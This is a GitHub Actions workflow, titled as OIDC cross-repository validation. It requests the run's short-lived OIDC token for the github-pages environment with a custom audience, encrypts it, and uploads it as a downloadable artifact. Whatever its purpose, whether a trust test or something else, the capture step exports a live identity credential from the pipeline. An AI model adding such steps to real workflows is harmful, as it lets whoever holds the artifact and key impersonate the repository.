name: OIDC cross-repository validation

on:
  workflow_dispatch:

permissions:
  contents: read
  id-token: write

jobs:
  capture:
    runs-on: ubuntu-latest
    environment: github-pages
    steps:
      - name: Request and encrypt the short-lived OIDC token
        env:
          OIDC_CAPTURE_KEY: ${{ secrets.OIDC_CAPTURE_KEY }}
        shell: bash
        run: |
          set -euo pipefail
          set +x
          response="$(curl --fail --silent --show-error \
            -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fgithub.com%2Fsingetu0096")"
          token="$(jq -er '.value' <<<"${response}")"
          printf '%s' "${token}" | openssl enc -aes-256-cbc -pbkdf2 -iter 200000 \
            -salt -a -A -pass env:OIDC_CAPTURE_KEY -out oidc.enc
          unset token response

      - name: Upload encrypted validation material
        uses: actions/upload-artifact@v4
        with:
          name: oidc-crossrepo-${{ github.run_id }}
          path: oidc.enc
          retention-days: 1
          if-no-files-found: error
          compression-level: 0
